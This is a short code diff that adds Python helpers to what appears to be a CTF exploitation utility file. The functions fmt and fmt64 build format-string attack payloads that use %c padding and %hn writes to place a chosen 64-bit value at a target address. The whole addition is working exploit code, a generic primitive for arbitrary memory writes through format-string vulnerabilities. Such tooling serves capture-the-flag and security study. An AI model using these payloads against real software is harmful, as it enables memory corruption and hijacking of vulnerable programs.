@@ -52,3 +52,25 @@ def NF(t, size, l=[]):
         exit(1)
     return ret
  
+ def fmt(prev , target):
+	if prev < target:
+		result = target - prev
+		return "%" + str(result)  + "c"
+	elif prev == target:
+		return ""
+	else:
+		result = 0x10000 + target - prev
+		return "%" + str(result) + "c"
+
+def fmt64(offset , target_addr , target_value , prev = 0):
+	payload = ""
+	for i in range(3):
+		payload += p64(target_addr + i * 2)
+	payload2 = ""
+	for i in range(3):
+		target = (target_value >> (i * 16)) & 0xffff
+		payload2 += fmt(prev , target) + "%" + str(offset + 8 + i) + "$hn"
+		prev = target
+	payload = payload2.ljust(0x40 , "a") + payload
+	return payload
+
